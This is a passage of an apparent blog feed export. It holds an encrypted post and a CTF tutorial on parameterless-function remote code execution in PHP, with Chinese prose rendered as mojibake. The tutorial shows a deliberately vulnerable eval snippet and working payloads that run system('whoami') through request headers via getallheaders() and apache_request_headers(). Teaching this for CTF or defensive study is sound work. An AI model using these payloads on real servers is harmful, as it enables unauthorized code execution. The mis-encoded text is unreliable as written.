a8e24516f1967ea07013da6215b16b167f9915ae7bb9c64e5b59334487bc1e34b983c60a24b86d1e31b99bcfdb61541c6b48e1e36ac030dfa156098ab34c4b56e5ed9dc8a8572b108f57c20c014c8ccebae6c1f3a7a2eed843baed0bce865b5f33879bbae89345c8a470bd8ed5a3725faae6353d1e5d7158e744069f2553b10b1c39f8b884890de761b0fe20b6634f7eb41ecde41463204661bbbe302a095c702f09b23de10dfb2c3bc3ecb2abdcef8281683fef6636e2d197f329a53e31e7e3619a6c998b499b99afcb9018f4cd96f7e139774e699f4263bbd22861b159e49598bd7df397522aa16505400b95efddbc5e9156479430c2017c673cf30ad5bc4d726042c24cd75cf7bc8c3ab0081628b7f077be4686542832850e8023984ac1b1898a438b6dbd5c84e4edf7e9aaf72c17198d81114851386726016676482e6bf5e4dc0eca4c604bc0782c6cefa7f454e27b3fd65a5ee59c9ff0296b931f29fbf93cda4a16f6416f69536488a59d9f4cb4c1a64672d6f316803d20b13bb976a567efd2b1b4a9e05d3f7c623fb27f0dfdc6f71381f5f8f888238c30093dd2087144a63709cfb07d8be81fd945a1d26c331f3491cac7906659b71b64b1f46d12fa753ff11fac01c5bc702a839efe07b898412c3f545e7f46a72ee53fb603d5c5eab1e95992dd32056284f5206e8a72df2dccdaa835579b01a8f7f59ab4e515cdcfa9f2df0a3de29ece89688dd1c23e68c26665da0a3a425e67e77cbc99eed8b3833a707151dfb2c454cdaceb563c67a8f8556e11702bb242c5edc7cdd21d6bbf1e8bf13e809fa274bc8acf1c5dead46b079f8d7158053d18ea168c1ec34364ec68268715a2a2bdd686d6a4ba2c3476abbd8bc3ddca14970beeac74a96ca997e53e77556e63dcf7e687b232bb17a6f1c82673df034e9a9a6658aee76d716ca90755a881915597ce25bf967b8fb031a457326ef613a1da3cd5b82ac328c4f966032202b76ed69b48ce5035dc295ac8e0396ac14d0c38ebf6325e94d7f57927807e9634eb378db7f6e5df44862a65b71dfb00c523bdabfdbe6d4719f77dec090f544190406cd5a196f7eaec621d99a08972f75a21d1783e0a322cb909512b91735b731d13ff28f2582a69085206f4f64102aaafc3bfe4d8ee17fc001570f3e4e22ab076f57082a2a0b46ebc1cbb3b20d73aa69338359b13d1df6e91b0e25f73c2e50ae893c14077cbba0a6dc0676eb6998123950397eb9099d4cd04a65c92a32ba83d6fe35d07333e99085df3135b8d592df0d6a02a0a4100ee6664febc159fa8eb445a00391548b98024e942c1efe84cfc82b207f3f228d8f02cac1d2d5de46396b762bc188994279f64b1ec52f54490b3e2d92ea5bd2334b2beb76dc305a70a2a6c0df5e7fc61a3eb3fbc3d51a5f05906d5096aacb3b20a44965dc5866a959834708f929b85c6cad9704ff7864b9cbf518310aa3b4bae2217be6a7572e23379b29e317aa92b3be7f159f94ed856f9108fffd598613262e07b1f40248f0f8e9b4872737a73dcdaf594ff57e2e9e29cdd8da3b4982272f2d145a6c8f5f28bbc9525d65027bb259945a315bd9ef88985b17175b7e42b0b68ce634b3b06ed600ed7b83534d4b98d235a25b88b5c2015fbee9960697801c00c652d22b3d8ff243a3b754e87d9802487192688fef4217c32ad31f914ad607372bb7d6473070fdb9c26d2279ac9cbcd47349d8bdf01b1651171e378496c4db978c354e55076b3de757678fb6c8ebfa10e3583c13310d84ed979d533c1a2a863a4e2081b01e298d84154f2cc83c12aef5a2cf86c480958f7a92ba93c174c1a79160319a8acbe87c400934afae7dbb3314b64ff3c035a9eddb320d9e05818dd076f21b749745b3c8cc8a750f4e2056ff822900f047180d7d23bba43e777fa7e65a4642b1946cb63a406a5b8d66cd9d0ab5e08a276f500b7ca30f0e119aba355efd142c66ecc9a3afb27e35e655d69b469f61149f00a091e972ef86338a1b7ce021421401956c504c6dfd263ed6a80de011e8e291b33c891d90c4d6a2a45a80082900914a4be40a709ecf4ef7e1573afd6a212a7b6aadca207af96c316f3262f87d0f0198bc5d216c5e9c0258877319d9806616e050bdbd39ad47c1d335627c426512462d7181cd8c65243eb91b5f26d91add29174f5d4bcf643ac25b3906ceb45e4d1b0895defd73369a6d99231394348de0f13721399725c433e8ebc79675e7e524fab4b28d418eea023895d2d33130121b5b301a38e17c0ba671023d8a88254407e5534cf2c8ea4dd14027c5ac3c828e5f9e8fe571a94b19633281ab3da22a0e8d27d4aa9af40e93e9183a7e8b782ab10fee9a59107172062ed9b52de520922a159644a311c30ccf452416dd36314cf4a81cdce6c07946bcd35b18e2e6308960ec6cf5c0e1f1adcbe18542b2e4d62db07f750c4f7e5c246d689a1630edcae96b9ed4d244b784dac41a0c89236ab676052821893500211a9401e3854ef9b68ed74d654de05ba01c5f4fc51a17e084f85e99e124cd3b89f6457d785949ff0c41ef3ebcca1fdff0f2db643311eb97ec19dbaaf78665083043d3a5ed96d3a1d6269a36e436fe50cfa355a9cc9ee5d02e769c0494137affcdbd0a476f1286b4c15c3c49768b2ae62bd2138bca74a0eab7ac31c08b4d9be34d328584d32f349064129b085ea9d6c266a1f5d3615094b98399f2b4d590dbf12f79b9a3c5a74b5f185454a6f207779fa6bfb207d25c767a9bc741ed60637a8d2a80e56cda10aef2132ed44bc77c663f0dc15efe1151fbb1e2496f00c68dfa504e1377cfe5972bbc4ecfeceb3cd563f2e698ad7fcd14f4c6c7a55f50c692aa0eb78ad3ee3ea4647b172c5fda5cb265a0a592782c913e7d36cc14437483124baed65f746a0b6a51dda45029c5e1e935e8b9001d9100704a301045281c9f52d7c774d153c9cd5694b1cd9e458f302037ab01bee0c46018d0fa5f3ce51cfe4e056b0b9caaca3ec5e1b8d3abacec1615dd5e6e391032b570f7261f6ded1df3358c439c8cb9e47d87d6981c4aa9b8a6e6be7dc596578b2417a0081a5be636934214be6b78ff911a2749814e4e9fdb66ecd42af6d596b47e37871e289bc68f210d2bf00f0b56554d2ebfa739312a11c472075a38bcf40a3842033d323be46eed49dbd7eaa0e5e3a5d2ab953d62b6e0174126b54fd6d707cbefcd202e7f5f74713f7a72f38b21e992e99d5389e15ddbf1eba78e0cb73fb17812774c6d37db7cca2cedb97df9959ab873836b4da50acd34e8d1833220899403ab5744f006abcbba382ceb8d09290c083d2186bebe4f6361c2c638d4a52c8ed586b7f76aa1a0cc6ce19ab04c19007b6ff74e80da0857a5954c91b09c1b687891324adccee07473ab5348e2c5d561eb4ecb709ec4f9d786b462b518fa0e63530c0a2145fb673649b3ee3bc5d6ea4dcc962d7d456ab537cd68daead001d17de120d9a6d80a7ba21dcfe3cdca667f4c65c2b45315431e7e41db8f9387b275be1ea67a967f60ea7f1ec30972bc92da043e11c7d2e56b45e0043b16d2ef1dd0f6c729c479fe2fc7c1406e854abfe763ab5e672c6fd8b9485bc614d97b26df20bd98c2e35324f76048f9341aa05671b28b8392d80f825289e429a39f6c703f72f9945631daf16238abc3d7615d804f5a725ba55b6f4569c88b86c6d54bd274ec242a5dfdee21c2c8d6857e14aed55539a8c5bb001e54965e397abecb79b517c3f49f3854d5af8cc829c4b168a5a009ac071dc912a2cb4a08c13cee4cbf3c78a665897a85e33453ec1647a9895b6b798e59598efe8a8c52d9ad993cf082f189fe367ef5dc033d5b0a3480c22b201c7cb93c81595b6b0859a9dd88010ed6aba31600db40743bef3f190e0d946f95a1110d28a0104d157f867b4b4d9174bbcb555067b6ef008bfc5d4f4c25755de17c74de3272a0df83491c4b952fdb5dae07c103e96157b66f93cf0b278fcc52ef5abb1fc697f9bb48c408e0d18c4f815722c375464fedbbd6cf5fb3a97e8ad0561ec6eeec5eb2e3a77cb75c5261d7e00712caef5440fd86cec333a052b5fad2c55a0114739760613dc6d0ed4cf50d6db866e87116c29d1c61cf1cad705f03c30cc58eed9c0054a3f646862f4d30c671d99a411dab8b8a991974775cfb3d49f0bb03ead66350fd8aa586588d79bd128be74f5c9dcb29473f6fdcc340cb3bfef28c207d43fa5102d90482d768d7b4cf8896b8dd49a7fa6f7984c1d0196cfea95e09c9058d75af9ce1ce16bb39dcf3ede4d6ab644128e4368ac2d44f3e4ab00896e817f1627c496c95ad2f7b6bfdb82181bd988f00a9d3eea765546767b6b935ffd1dd1917697453c525a18025f9179ec12a037f7211dcc595befbb7af5f35135f63ad100c20dca51780ff64e59485f8ea18f4573b5cd3639c9d9b8cd98a4589c33ce31e4df8ecd85944868bd3872474cf61411c6cab220a06db7962ce8ff6c8cd8d4a74d68354509f1e011441f239ae8f31f7d25d6fae45c8509e50699ef1ec315b96cb83c720e105ceeb309aaca2e90f7441da3476b72183fb8318380c79b5a665bbf232138db950833df492b039d52450cbaf1d629285b5a9c8e96961b438e77c900b21c1581267563b8b5a5d1db44dd392e82b190585cc8fec0c9f8f5489468e1b56cff454ede5cf74084b91012ef6b2d925e542133430d6ab29406978248ce9ad0ee8ed082e78230f23a81382f4f824d2acd3dc3451abf1baba139e2b6c75f44bd86f71ec232b5071d1d4cd220c74294a42427e574b3d5cebab85c782cc79a47561d85bc1fd1c7d3b19b1cf505639efec8ae76466b16c60bfda7209091d9951abc017d924b21bca51086e1fbac5f0cad3b761aabb730c8e04de712299e45053606c089393220f4a7d9b55870fd33b156130bd0859656b9022ffa44f3fee387406bf72393c3a1a434c6a4c9d9d3b6ebb4175fcadb2bb03221ccef97df827b308edae84023abf20608f6b21c6bb25c3138bd697d5957a96ccc70a78e055011ea1fb1d92f7302c605a9dbe3c854a849c8ba99dd1191f7b92270019cd3633be6f9152215ac91f1aec712e14c24b5bc7bd63dd165d44133d5c59a6369592bc4c0a84a2cb0b0da85d387a11543dbf98fd89a9b29b798501f3acbf1c63698bed33980e6cf609e603b2dadc962c5f6044730ea2279b797f486378c5dc636b342062840f945da8d1469107fc3b71427da39bdfb3b85a6434ae33a39baf31e8bc339a82eeedb5018f4d976cb2db8e6e74dfa842e4a49c13684ad9f5c04fc4b6c90760d83e651388e0a0b83ee0a73d9cd5d747025a78b0564e52d19dc3153413bab9f19b46e39b5b6dac1606d26eb198dd3b7299d83e918d695590cdbdd70d541e5cad669a6cc773005fae532746c9e664b06a6c284a5bf64a02e8997a4b035697e7dad8292a56ff85d13fddbb3376c5abf0d9eb3672d21dedfe4aa071e619fa5b6466d7927be0de796df29db1b173a1e85c9e9c129977ac71e5afb05dfc0171d754c8f233929241a3abd62bdb0e65253db1da2e90acc56f2d24a71678f3c2caa88ba93b0d892712baab5ff0569fe3a2b177fdd7c4ee561b16ace24f30dbfd4a6a164010e56465112415a67ea759ecf47139f58662453342abe75660f3b9578a00f97bb09708555ad4799ccc1a6779b5df74cfc5fd8a25cde878449851028ce8e2510754a00bf037f03db754fcf32e5ce8368a91dca8a020cdc5c906c63f23f4efefec13bd0351f7467a80c7c11b3db1e648ec6c06152c01f02606f6cf041269fdbbe9a41fc87abe1fb9cdff24689ef80c1473e592ba326b18ff9f23881c0d5fd7f8d802d54ce275555d47d62793b96a6ff3be1845395eb1e3d14b7b355fe1b750d85059cc266db25edabb4aec6b6ee91bdff63702f31dfb6271917a41f25c4537ddba67dfed89d889d85ad75f24b62aa826fe7756e654ebe5c84623bc9cb0dbc6446d85ffd2f2b03d6ed28be0f817f2be59c1ddd823bcf6ca064b29d37041ffeaa242aa510fd347d9a430eca402a47c70213742c80795488a670d0abef4b8db2946330a44e0481c75cb953bc9797c5cc2d6ef777c2bfbf953939509aca6d34b1fb441e3e20f3334ddfb9bc2d271bd0f90f430754670c802bfd218d1990a013154f8a95824e83009337c450595fadcd8aa46729dd089fee7cf715136cdffe2c14d6489194d7244241cfe1498dee5a2c14b0597875a003eaab13fa661761d5a69f16e0582a0f8dec84b228c41a6a41509b9c05460a6a612dd83a4033ff5fb24c9f7b44edb9b4e3fb41d8457462508597549615d468dd9e700ff94d39b582e73ce8db0762d10ef0c4a778254e1bf1f5415f3b7234d8386ac0ac2282447f92228801ab32c50ea30fded9e5fa36c54b290d2b66134720797144340283d0bf8259141dca0fbc2c645c89fc703cd221ceaef449633a96607280a362527f0c69185781e1ec77519612e3c221fa7c70fe696fbd565051e1ce2d40356b03ec44759a6f6fbf09028bc192e2dcacb4ae642f2c6f5e0b0b08d8cc645ab91b0c7dcef13ae10b3e1e10085603e348b89730c5246f9f6062796bd2ea6fffd637cdb37e84b8fce8f42aeea61cef0aa1a093eec12a76c3e8b29fcf26de403019f1221d8c9716f756dbebf9cd718dcd85077995a52259435f82ed05117dc4f24668814fc46d81764b23dc6e4b8909be3fdf4a512a4a6e31c4e76cb710af7a2fe45e8991a3478e73db219773c7c72096fbf20aaddbba21a47e4d3ac3194d08ff099ad40952b69356e720e006d4e697edc3ce74a153d4271c63d5d6b543577e844a47b1f98747236362b74f260a4c1f1d0ca6dd22567b767f3f73861882283d7b2ae3fb7b12951dfd47dc02cfba7b17da8e1774d95c66061e34ffb787763463c463d13995e8b6940baef66bd01c860c895ba245a3255191fb4b175c1779c51c684660b454729006a5ce29debd9850abbb1855167fe00c5c84eeeefcf874edfd510e54b3b28e29b0b56fc4ce4dffd45b233a1d6543604397d56f35cdf164040896416af95410d6c877ccec0bbe57ac53e2d5e59e4d345c9ab93cc34b4ffe8fb1691c273e33c913bfbc3b9bdc1ec32d36f7e28fcd9ec23c3dadafb3d9b562453396199d6307cce6febad73110a8d9393dad5e7a5beca6173636e75b17aa79daf5b1a8f4357af922a69a4857c1974ce2b76b047821969a9c4c5be2ebb333bedb06d951eef29b103377fb15853d95d014c5ca60322d5ffb26bb76ad075a935febeaac588bbde32431c98557ce1d5006fc9f9e765cca52c72472096963945026e4ddb3755fd66c6bcd1d4e327b91c804e54579ef9930e143914e1369348628ea32d868e5f662188ed0ec6d2b05d8862a0ed2e0d36fb53c325cf678444b0d710d9aecee1e1b6154b2ddaab2e394c334bb4d167493e2d7c9fbbceab230357c17a04eb8a2260c1af28945c2ded5b67df503cb36aa964865f2a42e8462ba426bd744d55a511ef5cd3a46a856d0fe375b186b93406c36e62192eaa646627ddb8aff7a30d8259b7069fdcc45577e2e4758af805aaf62342ddd70f05c98b624c1ff09447e9b1b47af6d3162c3af3be2c782b6280c4c4406b3ee0e46b045e97eaaa82453072c916355d240df7afe0899a0c843f508d7c7ba695b88ee124a6505fd9976e04288d654926a6829bc65482dd5a9f897d43b873fc4f0fcddd660d150f97ed0874e6c896fe8c83ae27d27753da6c340d4af45ff227e06c0981e75c2a4d9c71822813d878f4a3529225da0588e4df77b5ba909d56ff316b9d8028b038cb7a99668d2d97512b85119c2cba9d350f4a4787198fa8fd0695d50e913ec7170fc344fb6a324e7e8a8d6a2eed286df1451eb1bf6c1b245fd1b71592139b0b225fd703bc952d79daa95b9dfc7d61b0f2edd757c3b64ecbfbf5056edd2547782660b3292d5dfcb65f6f921e9aea080a45c400505fdf7378ad420c79a5c657c063c694b71a1678f78d1ed361fbc7a3d157b132264d2a17576cb8fc7c6597e7688c870b2498362adefb65ef9037a4f31e44c07174e624954f99fb8464db7a2f2319977e60f217dffa8b453646e433bdf7879bf666e0623820f5e8ef01e81ca14e2bda8cb55a8553d70f03cf865a7b026724716b943f077b508016b37878f7d8e4cf5b25dfad06f219223fa6a1d2cd9ef3900245dc168a3601a6fcde3bbdf34fae75f883ca9841881aa56f87fabc451642a4775d62adb47e88188f0226d2102899637fce299594f401586c4d0c2b63178fe78b39160cfa30342863d96c85e7a7b84be0757aac6b107d7ef19a6c40d1e87b27f46734acdac3aa40dbb10bf50ae63e4a992fb64929ab2277d8d6e18c52d4aaa8a930589e30e9b39498dede04a12b8c75921c5f31ddf02f5d4b611bd591f9292714c8eb683d5fa656a5602135a9d21cea177bb76b3c604670c9818249d92036b4572d13b6ed069a2cc6f2c1d093a112cda2950247d838f9f08220f5f42f1ecb7d2ab7c0b087c460334cdd77bf8226483cebcff03e837e87b290250d807691948fd838c891720025fb90deb375dea625e3c88e7f9278ad7aaf1a81cb89cc47ffdab88a1c326b93b6f0df9f087340fe8ee6d7f4efa9311eb86c345bc972c26b6d03f1cebafd47c4aea3d612e9658940a96f2e0370af498d6d1071248e3f4f5fcdaca49d168b487f67a7eb97519453d2b1345b48f9962880dd7ac9874fcef1c144c66520e69c403b7919dbf29a92ba1add7cac8cf18e08e4cb159d6ee6773590f982706c2a874c87e224bf5266216242dc70647dd1b1444aeaefce9c064f5b2b3cd4bf89e0cddf48e3ec7a4477299f7904bec1ad5b1a4dd0bc0505ded926d2bf5bb8b8b211cbee75c31d1e4f30bd4c75b809adb20df3839ede1870e1df5fe0ad960e2f8f50ff81ef813b43db67858ae82b7f8c7b862fa0dea656afe747f99e1aa33335b1154b3d3c5ae6c7c2977c19a1ca23061b3f6d58a7c9d1447c08a2bf61c805736285d64127321bed70fb3cb068235fa507e9b2f66f1213782981180a6419df7e0772dded20a12928ced038cab6c32822f0387dedf118a2efacc797e1490cb3158d18db98bfc0ff34d503a71f21dbcd8cce32350a5b1a3420b46e8cb06dfab02d00043793073e4e4c1b41b866cd2eb1ea1930785bd956f8c3f17ba657618ebb0b55b7ce079cfeed286ef284153fa9a2d9573b84153a7beeff5dabe4197879ae6b384d4ca420c7c7baf38caa8a574eefca7caba10674f692313108fcc1cc75c15772b2af8e302a2395fc5fb144957c66ddfee5962e90069d9e5ab664e364178dd9ebd48c56a5c0e8300ece89f7e8942d64d349ebd2d256d85895bfd7ccec0e5b3a92b505d09a69e4e3b68af0fe3f4c64d4868eed07319481fd3e66f7838af252d4c2be742c9311a19e861b943d8a958dd8b8b7d330d1f7e87d88ad145550908e7ad39fa877a06988f7896b26c7495ff4e8e8c2df995db8d1b573a2f4845dc3e7670fc953126577e830680529c7699099c993ef5e9c830ab94ab40ebf210af0467979c527e4169922afbfb3658781b69e2bd03909273bf42eb97b35eaf46e5712c6bfb8dca889bfbc5a9150279dfa3449254854d24f057010fdf6d6e5b40832fca929ab000333354cc354c96e09780d9541509c6f3d25ff849e7999715f72249ab6980b476e3fc45f93175cc368abdc24af68a604eb577a3a76eaa24b4258f07a38e0bacb96f418ade7da128e98cee6840567db80462b9821eb699651683c7b53afcac8862675d91eb952f1e834f152aa8206eedb1262ac6cf016dc3e506c67a7daf194f2b785da7b927b4f477c81c681dfedd187c831622ebe98668a03728dc70edccadd87a62f6f6e4d90</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="åˆ·é¢˜" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>æ— å‚æ•°rec</title>
    <link href="https://sakurahack-y.github.io/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/"/>
    <id>https://sakurahack-y.github.io/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/</id>
    <published>2022-04-10T06:32:10.000Z</published>
    <updated>2022-04-10T17:33:42.106Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h1><pre><code class="php">&lt;?phphighlight_file(__FILE__);if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;        eval($_GET[&#39;code&#39;]);&#125;?&gt;</code></pre><p>è¿™é‡Œä½¿ç”¨preg<em>replaceæ›¿æ¢åŒ¹é…åˆ°çš„å­—ç¬¦ä¸ºç©ºï¼Œ\wåŒ¹é…å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œç­‰ä»·äº [^A-Za-z0-9</em>]ï¼Œç„¶å(?R)?è¿™ä¸ªæ„æ€ä¸ºé€’å½’æ•´ä¸ªåŒ¹é…æ¨¡å¼ã€‚æ‰€ä»¥æ­£åˆ™çš„å«ä¹‰å°±æ˜¯åŒ¹é…æ— å‚æ•°çš„å‡½æ•°ï¼Œå†…éƒ¨å¯ä»¥æ— é™åµŒå¥—ç›¸åŒçš„æ¨¡å¼ï¼ˆæ— å‚æ•°å‡½æ•°ï¼‰ï¼Œå°†åŒ¹é…çš„æ›¿æ¢ä¸ºç©ºï¼Œåˆ¤æ–­å‰©ä¸‹çš„æ˜¯å¦åªæœ‰;<br>ä»¥ä¸Šæ­£åˆ™è¡¨è¾¾å¼åªåŒ¹é…a(b(c()))æˆ–a()è¿™ç§æ ¼å¼ï¼Œä¸åŒ¹é…a(â€œ123â€)ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„å€¼å‡½æ•°ä¸èƒ½å¸¦æœ‰å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨æ— å‚æ•°çš„å‡½æ•°è¿›è¡Œæ–‡ä»¶è¯»å–æˆ–è€…å‘½ä»¤æ‰§è¡Œã€‚</p><h1 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h1><pre><code class="php">ç›®å½•æ“ä½œï¼šgetchwd() ï¼šå‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚scandir() ï¼šå‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚dirname() ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚chdir() ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚æ•°ç»„ç›¸å…³çš„æ“ä½œï¼šend() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚array_shift() - åˆ é™¤æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¢«åˆ é™¤å…ƒç´ çš„å€¼ã€‚array_rand() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚array_flip() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚array_slice() å‡½æ•°åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›ã€‚array_reverse() å‡½æ•°è¿”å›ç¿»è½¬é¡ºåºçš„æ•°ç»„ã€‚è¯»æ–‡ä»¶show_source() - å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚readfile() - è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚highlight_file() - å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚file_get_contents() - æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚readgzfile() - å¯ç”¨äºè¯»å–é gzip æ ¼å¼çš„æ–‡ä»¶    ç¼–ç chr() å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚hex2bin() â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</code></pre><h1 id="å…³é”®å‡½æ•°"><a href="#å…³é”®å‡½æ•°" class="headerlink" title="å…³é”®å‡½æ•°"></a>å…³é”®å‡½æ•°</h1><h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h2><p>**getenv():**è·å–ç¯å¢ƒå˜é‡çš„å€¼(åœ¨PHP7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)</p><p>é€‚ç”¨äºï¼šphp7ä»¥ä¸Šçš„ç‰ˆæœ¬</p><p>php7.0ä»¥ä¸‹ç‰ˆæœ¬è¿”å›bool(false)</p><pre><code>?code=var_dump(getenv());</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235047746.png" alt="image-20220410235047746"></p><p>php7.0ä»¥ä¸Šç‰ˆæœ¬</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235228226.png" alt="image-20220410235228226"></p><p>è¿˜å¯ä»¥é€šè¿‡è¿™ä¸ªæ‰“å¼€phpinfo()é¡µé¢</p><pre><code>?code=var_dump(getenv(phpinfo()));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235551070.png" alt="image-20220410235551070"></p><h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h2><p>**getallheaders:**è·å–æ‰€æœ‰ HTTP è¯·æ±‚æ ‡å¤´ï¼Œæ˜¯apache_request_headers()çš„åˆ«åå‡½æ•°ï¼Œä½†æ˜¯è¯¥å‡½æ•°åªèƒ½åœ¨Apacheç¯å¢ƒä¸‹ä½¿ç”¨</p><pre><code>?code=print_r(getallheaders());</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235935581.png" alt="image-20220410235935581"></p><p><strong>payload1</strong></p><pre><code>?code=eval(reset(getallheaders()));# postä¸­å¢åŠ è¯·æ±‚å¤´flag: system(&#39;whoami&#39;);</code></pre><p>åœ¨æˆ‘çš„burpä¸­ç»è¿‡æµ‹è¯•ï¼Œè®¾ç½®çš„è¯·æ±‚å¤´è·‘åˆ°äº†æœ€å‰é¢ï¼Œè¿™ä¸ªé—®é¢˜æˆ‘ä¹Ÿå¾ˆå¥‡æ€ªï¼Œç½‘ä¸Šæµä¼ çš„æ˜¯å–æœ€åä¸€ä¸ªå¤´ï¼Œé‚£æˆ‘è¿™é‡Œå°±å–ç¬¬ä¸€ä¸ªå§ã€‚</p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œåœ¨è¿™é‡Œæ·»åŠ è¯·æ±‚å¤´</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411000647293.png" alt="image-20220411000647293"></p><p>è¾“å‡ºä¸€ä¸‹ç¬¬ä¸€ä¸ªè¯·æ±‚å¤´</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411000715021.png" alt="image-20220411000715021"></p><p>æˆ‘ä»¬å‘ç°æˆ‘ä»¬æ„é€ çš„è¯·æ±‚å¤´åœ¨æœ€å¼€å§‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºpayloadã€‚å…¶å®åœ¨å¼€å¤´è¿˜æ˜¯ç»“å°¾ï¼Œé—®é¢˜éƒ½ä¸å¤§ï¼Œçµæ´»å˜é€šå³å¯ã€‚</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001023643.png" alt="image-20220411001023643"></p><p><strong>payload2</strong></p><p>åœ¨php7ä»¥ä¸Šçš„ç‰ˆæœ¬ä½¿ç”¨</p><pre><code>?code=eval(end(apache_request_headers()));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001253812.png" alt="image-20220411001253812"></p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" 